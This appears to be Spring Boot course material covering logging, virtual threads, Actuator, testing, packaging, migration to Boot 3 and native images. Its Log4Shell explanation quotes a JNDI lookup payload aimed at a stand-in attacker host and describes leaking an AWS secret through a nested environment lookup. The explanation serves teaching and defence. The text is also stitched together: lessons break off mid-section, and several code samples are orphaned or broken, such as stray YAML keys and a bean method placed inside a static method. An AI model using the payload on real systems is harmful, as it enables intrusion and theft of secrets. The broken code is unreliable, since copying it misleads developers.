server.ssl.* (key-store, key-store-password, key-store-type: PKCS12) still works, but SSL bundles (Boot 3.1+) are the better model: one named bundle under spring.ssl.bundle.jks.* or spring.ssl.bundle.pem.* (PEM certificate and key files, as cert-manager writes them) can be shared by the server, RestClient, and data clients, and can reload when files change. PKCS12 replaced JKS as the JDK's default keystore type in Java 9. In Kubernetes, TLS is often terminated at the ingress or service mesh, so check before adding it to the app.

Jetty (spring-boot-starter-jetty) is a reasonable choice when you need its HTTP/2 or WebSocket implementation or its embeddability; Undertow has a small footprint but Boot 4 drops support for it, so avoid it for new services. For most services Tomcat is the right default: it is the most tested path in Boot.

Virtual threads

Definition · spring.threads.virtual.enabledOn Java 21+ with Boot 3.2+, spring.threads.virtual.enabled=true makes Tomcat and Jetty run each request on a new virtual thread, and switches the auto-configured applicationTaskExecutor (used by @Async), the task scheduler, and several messaging listener containers to virtual threads. server.tomcat.threads.max no longer limits concurrency. Virtual threads are daemon threads, so a non-web app that relies on scheduled work should also set spring.main.keep-alive=true.

Check three things before flipping the switch:

  • Pinning: on Java 21–23, blocking inside a synchronized block pins the virtual thread to its carrier, so a few such paths can stall the whole carrier pool. Find them with the JFR event jdk.VirtualThreadPinned and replace with ReentrantLock; JEP 491 (Java 24) removes most synchronized pinning.
  • ThreadLocal use: libraries that cache expensive objects per thread now create one per request, because virtual threads are never pooled.
  • Pool sizing: concurrency is now bounded by your downstream resources. With a Hikari pool of 10, thousands of virtual threads queue for connections and time out after connection-timeout (30 s by default). Size pools deliberately and limit concurrency with semaphores where a dependency cannot take the load.
$ oha -c 1000 -z 30s http://localhost:8080/slow      # platform threads: capped near 2,000 req/s
$ java -jar orders.jar --spring.threads.virtual.enabled=true
$ oha -c 1000 -z 30s http://localhost:8080/slow      # virtual: approaches 1000 / 0.1 s = 10,000 req/s, CPU permitting
What breaks in production
  • Virtual threads moved the queue: the web tier now accepts everything and the database pool falls over. Load test the whole path, not just /slow.
  • Graceful shutdown longer than the platform allows: if Kubernetes' terminationGracePeriodSeconds is shorter than timeout-per-shutdown-phase plus preStop delays, pods are killed mid-request (L296).
  • max-swallow-size and form limits left at 2 MB break large uploads with connection resets rather than a clean 413.
  • Port 0 in production for a service behind a fixed load balancer target.

Logging: SLF4J, Logback, MDC & Structured Logs

Your code logs against an API (SLF4J), Boot routes every other logging API into it, and one backend (Logback by default) decides format and destination. Production logging then comes down to three habits: parameterized messages at the right level, a correlation id in every line, and JSON output that machines can index.

One façade, many bridges

SLF4J is an API with no output of its own; Logback is Boot's default implementation, and Log4j2 is the alternative (L289). JUL (java.util.logging) and Commons Logging are older APIs still used by libraries. Get a logger with LoggerFactory.getLogger(MyClass.class) in a private static final field, or let Lombok's @Slf4j generate the same field.

MDC: a correlation id on every line

Definition · MDCThe Mapped Diagnostic Context is a per-thread Map<String, String> held by the logging backend. Every event logged on that thread snapshots it, patterns print an entry with %X{key} (%X{key:-} prints nothing when absent), and JSON encoders emit all entries as fields. Put a request id in at the edge, and every line written while serving that request can be found with one query.
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.Map;
import java.util.UUID;
import org.slf4j.MDC;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.Ordered;
import org.springframework.core.annotation.Order;
import org.springframework.core.task.TaskDecorator;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;

@Component
@Order(Ordered.HIGHEST_PRECEDENCE)
class RequestIdFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res, FilterChain chain)
            throws ServletException, IOException {
        String incoming = req.getHeader("X-Request-Id");
        String id = incoming != null && incoming.matches("[A-Za-z0-9-]{1,64}")   // never trust raw headers
                ? incoming : UUID.randomUUID().toString();
        MDC.put("requestId", id);
        res.setHeader("X-Request-Id", id);
        try {
            chain.doFilter(req, res);
        } finally {
            MDC.remove("requestId");   // threads are reused: a leftover id would tag the next request
        }
    }
}

@Configuration(proxyBeanMethods = false)
class MdcPropagationConfig {
    @Bean   // Boot applies a single TaskDecorator bean to the auto-configured @Async executor
    TaskDecorator mdcPropagation() {
        return task -> {
            Map<String, String> captured = MDC.getCopyOfContextMap();
            return () -> {
                if (captured != null) MDC.setContextMap(captured);
                try { task.run(); } finally { MDC.clear(); }
            };
        };
    }
}

MDC is thread-local, so it does not follow work onto another thread unless you copy it, as the decorator does for @Async and executors. With Micrometer Tracing on the classpath, traceId and spanId are placed in the MDC for you and Boot's default pattern includes them, so prefer %X{traceId} over a home-grown id once tracing is set up.

Structured JSON logs and what never to log

Log aggregators (Elasticsearch, Loki, Graylog) index fields, not prose. Since Boot 3.4, logging.structured.format.console: ecs (or logstash, gelf) emits one JSON object per line with level, logger, thread, message, MDC entries and exception; before 3.4, use logstash-logback-encoder. Add stable fields such as service name and version so dashboards can filter.

What breaks in production
  • Secrets and personal data in logs: passwords, bearer tokens, session cookies, API keys, full card numbers (PCI DSS forbids storing the full PAN unprotected), and PII such as emails and national IDs. Logs are copied to more systems, with weaker access control, than your database.
  • Records print everything: a record's generated toString() includes every component, so log.info("{}", credentials) leaks the password. Override toString() on types that hold secrets.
  • Log injection: user input with newlines forges fake log lines in plain-text logs; JSON output escapes it.
  • DEBUG left on for a chatty package fills the disk or the aggregator's quota in hours.

Async loggers and garbage-free mode

Definition · Async loggerWith async loggers, the calling thread copies the event into a pre-allocated LMAX Disruptor ring buffer and returns; a single background thread formats and writes. Unlike a queue-based async appender there is no lock on the hot path, so throughput scales better when many threads log heavily (the Log4j2 manual reports large gains; measure on your workload). Make all loggers async with log4j2.contextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector in log4j2.component.properties plus the com.lmax:disruptor jar, or mix with <AsyncLogger>/<AsyncRoot> elements.

Two costs come with it. When the ring buffer is full, the default policy makes callers wait; log4j2.asyncQueueFullPolicy=Discard drops events at or below a threshold level instead. And location information (%L, %M, %C) needs a stack walk per event, which wipes out the gain, so keep it off. Garbage-free mode (Log4j 2.6+) reuses thread-local buffers and event objects so steady-state logging allocates almost nothing, which reduces GC pressure in latency-sensitive services. Log4j disables thread-locals when it sees the Servlet API, to avoid class-loader leaks on WAR redeploys; an embedded-server Boot app never redeploys, so setting log4j2.is.webapp=false is a reasonable way to get it back.

Log4Shell (CVE-2021-44228)

Disclosed in December 2021, the flaw affected Log4j 2.0-beta9 through 2.14.1. Log4j evaluated ${...} lookups not only in configuration but in the formatted log message, so a perfectly ordinary call like log.info("User-Agent: {}", ua) triggered a JNDI lookup whenever the header held ${jndi:ldap://attacker/x}. The LDAP reply could make the JVM load and run remote code (on older JDKs) or deserialize gadget chains, and nested lookups such as ${env:AWS_SECRET_ACCESS_KEY} inside a DNS name exfiltrated secrets even where code execution failed. Fixes followed in quick succession: 2.15.0 disabled message lookups by default, 2.16.0 removed them and disabled JNDI by default, and 2.17.x fixed follow-up CVEs. Default Boot apps were not exposed: they use Logback, and the log4j-to-slf4j and log4j-api jars in the default starter cannot be exploited alone.

The supply-chain lessonThe vulnerable jar was usually transitive and unnoticed. What helped teams patch in hours instead of weeks: an SBOM saying exactly where log4j-core ran (Actuator's /sbom, L291), dependency scanning in CI, a BOM where one property (log4j2.version) upgrades every module, and features nobody asked for (message lookups) being off by default.

Shipping logs and taming noise

In containers, write to stdout and let the platform collect it (twelve-factor XI: logs are an event stream, not files the app manages). The container runtime writes each container's stream to the node, and a collector ships it: Filebeat into Elasticsearch/Logstash (ELK), Fluent Bit into almost any backend, or Promtail (now superseded by Grafana Alloy) into Loki. Collectors run as a node-level DaemonSet, or as a sidecar when a pod needs special handling. JSON lines (L288) let the backend index fields without fragile parsing. The full ELK and Loki pipelines are built on Day 412.

Noisy loggers are handled at three levels: raise their level, rate-limit them (BurstFilter in Log4j2, DuplicateMessageFilter in Logback), or sample in code:

import java.util.concurrent.atomic.AtomicLong;
import org.slf4j.Logger;

final class SampledLogger {
    private final Logger log;
    private final long everyN;
    private final AtomicLong count = new AtomicLong();

    SampledLogger(Logger log, long everyN) { this.log = log; this.everyN = everyN; }

    void info(String format, Object... args) {
        if (count.getAndIncrement() % everyN == 0) {   // 1 in N, cheap and lock-free
            log.info(format, args);
        }
    }
}
What breaks in production
  • Two backends on the classpath: an exclusion missed on one path leaves Logback present; SLF4J warns about multiple providers and Boot may configure the one you did not expect.
  • File logging inside a container: logs vanish with the container, or fill its writable layer until the node evicts it.
  • Ring buffer full under an incident: logging volume peaks exactly when things break; without a discard policy, request threads stall on logging.
  • Pinning an old Log4j version through an explicit version in a POM keeps a CVE alive after the BOM was upgraded.

DevTools, Hot Reload & Developer Experience

30m video35m practice

A fast inner loop is a feature you build: DevTools restarts only the part of the JVM that holds your code, Docker Compose and Testcontainers support start your dependencies for you, and none of it ever ships to production.

Restart with two class loaders

Definition · DevTools restartspring-boot-devtools watches the classpath directories of your project. When files change (your IDE compiles on save, or you run a build), it closes the application context, discards the restart class loader that held your classes, creates a new one, and runs main again on a fresh thread. Library jars stay in the base loader. Unlike class reloading, every restart is a clean context, so there is no stale state, but also no preserved in-memory state.
<dependency>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-devtools</artifactId>
  <scope>runtime</scope>
  <optional>true</optional>        <!-- do not leak into modules that depend on this one -->
</dependency>

spring:
  devtools:
    restart:
      trigger-file: .reloadtrigger              # restart only when this file is touched
      additional-exclude: "data/**"            # changes here never restart
      additional-paths: ../shared-config        # watch a directory outside the classpath
      poll-interval: 1s
      quiet-period: 400ms                       # wait for the build to finish writing

By default, changes under static/, public/, templates/ and META-INF/resources/ do not restart (they are served live and trigger LiveReload instead). A trigger file is useful when your IDE compiles continuously and you want one restart per batch of edits. For a multi-module workspace, META-INF/spring-devtools.properties with restart.include.* entries moves your sibling module jars into the restart loader.

DevTools can push class changes to an application running elsewhere: set spring.devtools.remote.secret, include DevTools in the repackaged jar (the Maven plugin's excludeDevtools=false), and run RemoteSpringApplication locally with the remote URL. Anyone who learns the secret can upload code into your JVM, so this is for a disposable development environment only. The old HTTP debug tunnel was removed in Boot 2.3; for remote debugging start the JVM with -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 and reach it through kubectl port-forward or an SSH tunnel.

Production safety netThe Maven and Gradle plugins exclude DevTools from repackaged jars by default, and DevTools disables itself when the app is launched with java -jar or from a special class loader, treating that as production. Keeping it at runtime scope and optional (Gradle: developmentOnly) completes the picture.

Alternatives: class reloading

  • Plain JVM HotSwap (debugger "reload changed classes"): redefines method bodies in place, but cannot add or remove methods or fields, change signatures, or change the class hierarchy.
  • HotswapAgent with an enhanced-redefinition JVM (JetBrains Runtime or DCEVM builds): allows structural changes, and plugins refresh Spring beans for some cases.
  • JRebel: a commercial agent that reloads classes and reconfigures many frameworks in place, keeping application state.

Reloading preserves state but can leave it inconsistent (a cached bean built from old code); restart is slower but always clean. For most Boot work, DevTools restart is the predictable default.

Run configurations and dependencies on demand

./mvnw spring-boot:run forks a JVM with target/classes on the classpath, honours -Dspring-boot.run.profiles=dev and jvmArguments, and gives everyone the same command. An IDE run configuration is faster for debugging; keep its profile and environment in a shared file so "works in my IDE" means something.

Docker Compose support (spring-boot-docker-compose, Boot 3.1+) finds compose.yaml at startup, runs docker compose up, waits for the containers, and creates connection details for recognized images (Postgres, Redis, RabbitMQ and others), so you need no spring.datasource.url locally. Actuator II: Custom Endpoints, Health Indicators & Security

45m video50m practice

Health is a contract with the platform: liveness says "restart me", readiness says "send me traffic", and each must be built from the right signals. Custom indicators, endpoints and info contributors extend Actuator in a few lines; securing it is not optional.

A health indicator for a downstream dependency

import java.time.Duration;
import org.springframework.boot.actuate.health.AbstractHealthIndicator;
import org.springframework.boot.actuate.health.Health;
import org.springframework.boot.actuate.health.Status;
import org.springframework.http.client.SimpleClientHttpRequestFactory;
import org.springframework.stereotype.Component;
import org.springframework.web.client.RestClient;

@Component   // bean "paymentGatewayHealthIndicator" appears as component "paymentGateway"
class PaymentGatewayHealthIndicator extends AbstractHealthIndicator {
    private final RestClient client;

    PaymentGatewayHealthIndicator(RestClient.Builder builder) {
        super("Payment gateway health check failed");    // logged when the check throws
        var factory = new SimpleClientHttpRequestFactory();
        factory.setConnectTimeout(Duration.ofSeconds(1)); // a hanging check hangs /health
        factory.setReadTimeout(Duration.ofSeconds(2));
        this.client = builder.baseUrl("https://payments.internal").requestFactory(factory).build();
    }

    @Override
    protected void doHealthCheck(Health.Builder health) {
        long start = System.nanoTime();
        var code = client.get().uri("/status").retrieve().toBodilessEntity().getStatusCode();
        health.status(code.is2xxSuccessful() ? Status.UP : Status.DOWN)
              .withDetail("httpStatus", code.value())
              .withDetail("latencyMs", (System.nanoTime() - start) / 1_000_000);
    }
}

AbstractHealthIndicator catches any exception and reports Health.down(exception), with the exception class and message as details. The bare HealthIndicator interface is one method, Health health(), so a lambda @Bean works for simple checks; return Health.up().withDetail("brokers", 3).build() or Health.down(ex).build(). In a WebFlux app implement ReactiveHealthIndicator and return a Mono<Health> with a timeout(...) and onErrorResume to DOWN. To group related checks under one name, register a CompositeHealthContributor.fromMap(Map.of("fedex", fedex, "ups", ups)) bean: it appears as one component with nested children, and aggregates like the root.

Liveness, readiness and Kubernetes

      group:

        readiness:

Definition · Application availabilityBoot tracks two states through ApplicationAvailability: LivenessState (CORRECT, BROKEN) and ReadinessState (ACCEPTING_TRAFFIC, REFUSING_TRAFFIC). They change by publishing AvailabilityChangeEvent; the livenessState and readinessState health contributors simply report the current value.

Liveness must never depend on an external service. If the database is down and liveness includes db, every pod fails liveness together and Kubernetes restarts them all in a loop, which cannot fix the database and adds cold-start load once it recovers. Even readiness should include only what this instance needs that might differ between instances; a shared downstream in every pod's readiness can empty the Service and take down endpoints that did not need it. Your code can drive the states:

import org.springframework.boot.availability.AvailabilityChangeEvent;
import org.springframework.boot.availability.LivenessState;
import org.springframework.boot.availability.ReadinessState;
import org.springframework.context.ApplicationEventPublisher;
import org.springframework.stereotype.Component;

@Component
class AvailabilityControl {
    private final ApplicationEventPublisher events;
    AvailabilityControl(ApplicationEventPublisher events) { this.events = events; }

    void drainForMaintenance() { AvailabilityChangeEvent.publish(events, this, ReadinessState.REFUSING_TRAFFIC); }
    void resume()              { AvailabilityChangeEvent.publish(events, this, ReadinessState.ACCEPTING_TRAFFIC); }
    void unrecoverable()       { AvailabilityChangeEvent.publish(events, this, LivenessState.BROKEN); }
}

import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import org.springframework.boot.actuate.endpoint.annotation.*;
import org.springframework.boot.actuate.info.Info;
import org.springframework.boot.actuate.info.InfoContributor;
import org.springframework.stereotype.Component;

@Component
@Endpoint(id = "features")                         // /actuator/features once exposed
public class FeaturesEndpoint implements InfoContributor {
    private final Map<String, Boolean> flags = new ConcurrentHashMap<>(Map.of("new-checkout", false));

    @ReadOperation                                  // GET /actuator/features
    public Map<String, Boolean> all() { return Map.copyOf(flags); }

    @ReadOperation                                  // GET /actuator/features/new-checkout; null gives 404
    public Boolean one(@Selector String name) { return flags.get(name); }

    @WriteOperation                                 // POST {"enabled": true}
    public void set(@Selector String name, boolean enabled) { flags.put(name, enabled); }

    @DeleteOperation                                // DELETE /actuator/features/new-checkout
    public void remove(@Selector String name) { flags.remove(name); }

    @Override                                       // also publish the flags in /info
    public void contribute(Info.Builder builder) { builder.withDetail("features", all()); }
}

@Endpoint operations are technology-neutral and available over HTTP and JMX. @WebEndpoint declares an HTTP-only endpoint, and @EndpointWebExtension(endpoint = X.class) adds HTTP-specific behaviour to an existing one, such as returning a WebEndpointResponse with a custom status; Boot's own health endpoint uses one to map DOWN to 503. Write operations require unrestricted access (L291).

Defence in depth: a separate management port reachable only inside the cluster (network policy), a dedicated OPS role for everything except health and info, show-values: when-authorized with roles for /env and /configprops, and masking functions for keys you know are sensitive. Forensics endpoints/threaddump returns every thread's stack and lock state (find deadlocks, pool exhaustion, threads stuck on I/O); take three, a few seconds apart, and compare. /heapdump streams an HPROF file the size of the live heap for Eclipse MAT, and pauses the JVM while writing it. Both are invaluable at 3 a.m. and catastrophic if public: the heap holds credentials, tokens and customer data in clear.
What breaks in production

  • Expensive checks on every probe: probes every few seconds from every kubelet plus monitoring can load a downstream noticeably; cache the result in the indicator for a few seconds.
  • Probe paths caught by the security chain: 401 to the kubelet means never ready.

The test context cache

Definition · Context cache keyThe TestContext framework builds a MergedContextConfiguration for each test class and uses it as the cache key. It includes the configuration classes, context initializers, context customizers (Boot registers these for mock beans, @DynamicPropertySource, Testcontainers service connections, @Import on the test class and more), active profiles, property source locations, inline properties, the context loader, and any parent. Two classes share a context only if all of these are equal. The cache lives for the JVM (one Surefire fork) and holds up to 32 contexts by default, evicting least recently used.

So one class with properties = "feature.x=true", another with an extra @MockitoBean (or the older @MockBean), and a third with @ActiveProfiles("other") each pay a full startup. Keep the suite fast with a shared base class or meta-annotation that fixes profile, properties, containers and mocks; make test-specific behaviour come from data, not configuration; and check the hit rate with logging.level.org.springframework.test.context.cache=debug, which logs cache statistics.

    static { postgres.start(); redis.start(); }        // one start per JVM, shared by every subclass

    static void redisProperties(DynamicPropertyRegistry registry) {
        registry.add("spring.data.redis.host", redis::getHost);
        registry.add("spring.data.redis.port", () -> redis.getMappedPort(6379));

        @Bean Clock clock() { return Clock.fixed(Instant.parse("2026-01-01T00:00:00Z"), ZoneOffset.UTC); }
    }
}

@TestConfiguration adds beans on top of the application's configuration (a nested one is picked up automatically; a top-level one is excluded from component scanning and needs @Import). Use @TestPropertySource(properties = ...) or the properties attribute for fixed values and @DynamicPropertySource for values that exist only at runtime, like container ports. Overriding an existing bean such as Clock also needs spring.main.allow-bean-definition-overriding=true in the test profile, or a @Primary test bean.

@DirtiesContext and transactional tests

@DirtiesContext closes the context after a test so the next one builds a new one. It fixes a symptom (a test leaked state into a singleton, a cache, or the database) at the cost of a full startup each time it fires. Find the leak and reset it instead: clean tables with @Sql, clear caches in @AfterEach, or avoid mutable singletons.

What breaks in production
  • @Transactional tests hide bugs: the test rolls back, so the persistence context is never flushed (constraint violations and bad SQL go undetected unless you call flush()), lazy loading works because the session stays open (a LazyInitializationException waiting for production), and @TransactionalEventListener(AFTER_COMMIT) handlers never run.
  • Rollback does not cross threads: with RANDOM_PORT, the server handles requests on its own threads and transactions, so a test's @Transactional rolls back nothing the server wrote.
  • A context per test class: a suite of 200 classes with small configuration differences can spend most of its time starting Spring, which teams then "fix" by running fewer tests.

Test Slices: @WebMvcTest, @DataJpaTest & Friends

A test slice starts a real but partial Spring context containing only one layer's beans and auto-configuration. You test that layer against real Spring behaviour (request mapping, JSON, validation, SQL) without paying for, or depending on, the rest of the application.

Why slices exist

Definition · Test sliceA slice annotation such as @WebMvcTest disables full auto-configuration, imports only the auto-configurations listed for that slice, and applies a type filter to component scanning so only matching beans are registered. Because the context is small, it starts quickly (typically well under the time of a full context), and it is cached like any other test context (L293).

@WebMvcTest and MockMvc

A testing strategy for a real service

  • Unit tests, no Spring (most tests): domain logic and services with fakes or mocks; milliseconds each.
  • Slices for each integration seam: every controller's contract (mapping, validation, status codes, JSON shape), every custom query against real Postgres, JSON serialization of public DTOs, each outbound HTTP client.
  • A few @SpringBootTest end-to-end tests on a shared context with containers: the critical user journeys, security wiring, and one test that the production profile starts (L284).
What breaks in production

  • H2 green, Postgres red: JSONB, window functions, case sensitivity and locking differ. Test queries on the real engine.
  • Over-mocking: a @WebMvcTest that mocks the service to return exactly what the assertion expects verifies Mockito, not your code. Assert on mapping, validation and serialization, the things the slice is for.

Packaging: Executable JARs, Layers & Container Images

45m video50m practice

A Boot fat jar is a normal jar with your classes and every dependency nested inside, plus a small launcher that knows how to load classes from jars within a jar. For containers you usually unpack it again, into layers that change at different rates, so that a code change rebuilds and ships megabytes instead of the whole dependency set.

Definition · Nested jar loadingThe JDK's class loaders can read classes from a jar on disk but not from a jar stored inside another jar. java -jar starts JarLauncher (the Main-Class), which builds a class loader over BOOT-INF/classes and every jar in BOOT-INF/lib using Boot's own JarFile implementation. Nested jars are stored uncompressed, so their entries can be read by offset without extracting anything to disk. The launcher then calls main on the Start-Class.
import org.springframework.boot.SpringApplication;

public class WhereAmI {
    public static void main(String[] args) {
        // run inside the fat jar: a jar:nested: URL pointing into BOOT-INF/lib (Boot 3.2+ loader)
        System.out.println(SpringApplication.class.getProtectionDomain().getCodeSource().getLocation());
    }
}

Run it with JVM options before -jar and application arguments after it: java -XX:MaxRAMPercentage=75 -Xlog:gc -jar orders.jar --spring.profiles.active=prod. In containers, JAVA_TOOL_OPTIONS injects JVM options without changing the entrypoint.

Layers and a cache-friendly Dockerfile

BOOT-INF/layers.idx assigns each entry to a layer. Since Boot 3.3, the tools jar mode extracts them (the older -Djarmode=layertools ... extract still works but is deprecated):

# Dockerfile, multi-stage (the full pipeline is built on Day 422)
FROM eclipse-temurin:21-jre AS builder
WORKDIR /builder
COPY target/*.jar application.jar
RUN java -Djarmode=tools -jar application.jar extract --layers --destination extracted

FROM eclipse-temurin:21-jre
WORKDIR /application
COPY --from=builder /builder/extracted/dependencies/ ./
COPY --from=builder /builder/extracted/spring-boot-loader/ ./
COPY --from=builder /builder/extracted/snapshot-dependencies/ ./
COPY --from=builder /builder/extracted/application/ ./
ENTRYPOINT ["java", "-jar", "application.jar"]

The extracted application.jar is a thin jar whose manifest classpath points at plain jars in lib/, which the JVM can read directly: faster startup than nested loading, and a prerequisite for class data sharing.

Faster startup: CDS and the AOT cache

Class Data Sharing stores parsed and verified classes in an archive that later JVMs map into memory. Do a training run that starts the app and exits, then reuse the archive:

$ java -XX:ArchiveClassesAtExit=app.jsa -Dspring.context.exit=onRefresh -jar application.jar   # training
$ java -XX:SharedArchiveFile=app.jsa -jar application.jar                                    # production
# JDK 24+ (JEP 483): the AOT cache also stores loaded and linked classes
$ java -XX:AOTMode=record -XX:AOTConfiguration=app.aotconf -Dspring.context.exit=onRefresh -jar application.jar
$ java -XX:AOTMode=create -XX:AOTConfiguration=app.aotconf -XX:AOTCache=app.aot -jar application.jar
$ java -XX:AOTCache=app.aot -jar application.jar

spring.context.exit=onRefresh (a Spring Framework 6.1+ system property) stops the training run right after the context refreshes. The archive must be created with the same JDK and the same classpath it is used with, and it works with the extracted layout, not the nested fat jar. Reported improvements are substantial for Spring apps; measure your own.

What breaks in production
  • Copying the fat jar into the image as one layer: every commit pushes and pulls the full dependency set; registries fill and deploys slow down.
  • Reading resources as files: new File(getClass().getResource("/x.csv").toURI()) works in the IDE and fails inside a jar, where resources are not files. Use getInputStream() or Spring's Resource.
  • CDS archive from another JDK build or classpath: the JVM silently ignores it (warns with logging enabled), and the startup gain disappears.
  • JVM ignoring container limits because of hand-set -Xmx larger than the pod limit: the kernel kills the pod (OOMKilled) without a Java stack trace.

Runtime: Runners, Lifecycle, Graceful Shutdown & Exit Codes

40m video40m practice

A Boot process has a lifecycle you can hook at well-defined points: before the context exists, after it is ready, and while it shuts down. Putting work at the right point is the difference between a service that starts, drains and exits cleanly and one that drops requests on every deploy.

Customizing SpringApplication

import java.util.Map;

Graceful shutdown, SIGTERM and Kubernetes

Algorithm · Pod termination
  1. The pod is marked terminating; endpoint removal starts propagating to kube-proxy and ingresses, asynchronously. The kubelet runs preStop (the sleep keeps the app serving while traffic moves away).
  2. The kubelet sends SIGTERM. The JVM runs shutdown hooks; Boot's hook calls close() on the context.
  3. Boot publishes ReadinessState.REFUSING_TRAFFIC; the web server stops accepting new requests and waits for in-flight ones, up to the phase timeout.
  4. Remaining SmartLifecycle beans stop in descending phase order (message listeners, schedulers), then singletons are destroyed (@PreDestroy, pool closing).
  5. If all this exceeds terminationGracePeriodSeconds, the kubelet sends SIGKILL: no hooks, in-flight work lost.

@SpringBootApplication   // batch job: exit with a code the scheduler (cron, Kubernetes Job) can act on

        var context = SpringApplication.run(ReportJob.class, args);

Spring Boot 3.x: Jakarta, Migration & What Changed

40m video40m practice

Boot 3 was the largest break in Spring's history: a new Java baseline, a renamed enterprise namespace, and several long-deprecated APIs removed at once. Migrating safely means doing it in small, verifiable steps, mostly with tools, and knowing in advance which changes compile fine but behave differently.

javax to jakarta

Definition · The namespace changeWhen Oracle transferred Java EE to the Eclipse Foundation, the javax.* package names could not be evolved there, so Jakarta EE 9 renamed every enterprise API to jakarta.*. Boot 3 is built on Jakarta EE 9+ (it targets EE 10), so affected imports are: persistence (jakarta.persistence), servlet (jakarta.servlet), validation (jakarta.validation), annotations (jakarta.annotation.PostConstruct, PreDestroy), transactions (jakarta.transaction), plus mail, JMS, websocket and others. Packages that belong to the JDK itself, such as javax.sql, javax.crypto and javax.net, do not change.

Hibernate 6 changes that bite

  • ID generator defaults: GenerationType.AUTO now uses a sequence per entity (orders_SEQ style names) with allocation size 50, instead of Boot 2's shared hibernate_sequence. After an upgrade, inserts fail because the sequence does not exist, or produce duplicate keys if a sequence that increments by 1 meets a pooled optimizer expecting 50. Declare @SequenceGenerator explicitly per entity, or set spring.jpa.properties.hibernate.id.db_structure_naming_strategy=legacy while you migrate.
  • Stricter HQL/JPQL: the new query parser rejects queries Hibernate 5 tolerated, such as comparisons between incompatible types or ambiguous implicit joins, at startup for named queries and on first execution otherwise. The legacy org.hibernate.Criteria API is gone; use JPA Criteria.
  • Enum mapping: @Enumerated(ORDINAL) maps to SMALLINT/TINYINT types, and generated DDL can add check constraints for enum values, so ddl-auto=validate may fail against an existing INTEGER column.
  • Basic type mappings: several defaults moved, for example Duration and some floating-point and NUMERIC precisions, and Instant handling with time zones. Validate the schema against a copy of production before cutting over.

The migration checklist

  1. Upgrade to the latest 2.7.x and remove every deprecation warning (2.7 already offers most replacement APIs, including the .imports file and SecurityFilterChain).
  2. Move the build and runtime to Java 17 or 21 while still on 2.7.
  3. Inventory third-party libraries; find a Jakarta-compatible version for each, or a replacement.
  4. Run the OpenRewrite recipe to 3.0; review the diff; add the properties migrator.
  5. Fix Security configuration, trailing-slash clients, Sleuth to Micrometer Tracing, and test annotations.
  6. Run the full suite plus ddl-auto=validate against a production schema copy; compare metric names and tags on dashboards.
  7. Canary deploy; then step through 3.1, 3.2 and onward one minor at a time, reading each release's notes.
What breaks in production
  • Mixed namespaces: one library still on javax.servlet registers a filter that never loads; the failure appears only on the code path that needs it.
  • Clients relying on trailing slashes start getting 404s; find them in access logs before upgrading, or add explicit redirects.
  • Duplicate primary keys from the ID generator change, discovered by the first busy hour after deploy.
  • Dashboards go blank when observation-based metrics rename or retag series.

AOT, Native Images & Production Project Structure

50m video55m practicemilestone project

Spring AOT moves work that Spring normally does at startup (parsing configuration, evaluating conditions, reflecting over beans) to build time; GraalVM native images take that to its limit with a closed world. Both trade flexibility for startup speed, and the phase ends by assembling everything into one production-shaped service.

What Spring AOT generates

Definition · AOT processingThe process-aot goal of spring-boot-maven-plugin starts your application context at build time up to bean-definition registration (no beans are instantiated), then writes Java source that registers the same bean definitions directly, plus RuntimeHints recorded as GraalVM metadata (reflect-config.json, resource and proxy configuration) and pre-generated CGLIB proxy classes. At run time the generated initializer replaces component scanning, @Configuration parsing and condition evaluation. Consequence: the bean graph is fixed at build time, so @Profile and @ConditionalOnProperty choices cannot change at run time.

The output also runs on a normal JVM: run the AOT-processed jar with -Dspring.aot.enabled=true for a moderate startup gain without going native.

GraalVM native images

$ ./mvnw -Pnative native:compile          # needs GraalVM; 'native' profile comes from starter-parent
$ ./mvnw -Pnative spring-boot:build-image # or build a native container image with buildpacks
$ ./target/orders                          # starts in tens of milliseconds for a small service

native-image analyses everything reachable from main under a closed-world assumption: no class can appear at run time that was not seen at build time. It compiles that code ahead of time and snapshots parts of the heap, producing an executable that starts very fast (reports for small Spring services are often well under a tenth of a second) with a much smaller memory footprint. The costs: builds take minutes and several gigabytes of RAM; peak throughput is usually below a warmed-up JIT unless you use profile-guided optimization; and GC choices and tooling are more limited.

Native is worth it for serverless functions and scale-to-zero services where cold start is user-visible, CLIs, and fleets of small, mostly idle services where memory is the bill. It is not for long-running, high-throughput services where the JIT wins after warm-up, for apps built on dynamic libraries, or when build time and debuggability matter more than startup. CDS and the AOT cache (L295) recover part of the startup gain on the JVM with none of the restrictions.

Project structure for a real service

com.acme.orders
├── OrdersApplication.java
├── config/           # @Configuration, properties records, security, NativeConfig
├── api/              # controllers, request/response DTOs, @ControllerAdvice
├── application/      # use cases, @Transactional services, ports (interfaces)
├── domain/           # aggregates, value objects, domain rules: no Spring imports
└── infrastructure/   # JPA repositories, HTTP clients, messaging: implements ports

Package by layer alone scales poorly: every feature touches every package and nothing can be package-private. Package by feature alone hides the dependency direction. A practical compromise is these five layers inside one bounded service, splitting into feature packages (each with the same five) once the service grows. Enforce the direction with a test, or it erodes in months:

import static com.tngtech.archunit.lang.syntax.ArchRuleDefinition.noClasses;
import static com.tngtech.archunit.library.Architectures.layeredArchitecture;

import com.tngtech.archunit.core.importer.ImportOption;
import com.tngtech.archunit.junit.AnalyzeClasses;
import com.tngtech.archunit.junit.ArchTest;
import com.tngtech.archunit.lang.ArchRule;

@AnalyzeClasses(packages = "com.acme.orders", importOptions = ImportOption.DoNotIncludeTests.class)
class ArchitectureTest {
    @ArchTest
    static final ArchRule layers = layeredArchitecture().consideringAllDependencies()
            .layer("Api").definedBy("..api..")
            .layer("Application").definedBy("..application..")
            .layer("Domain").definedBy("..domain..")
            .layer("Infrastructure").definedBy("..infrastructure..")
            .layer("Config").definedBy("..config..")
            .whereLayer("Api").mayNotBeAccessedByAnyLayer()
            .whereLayer("Application").mayOnlyBeAccessedByLayers("Api", "Infrastructure", "Config")
            .whereLayer("Infrastructure").mayOnlyBeAccessedByLayers("Config");

    @ArchTest
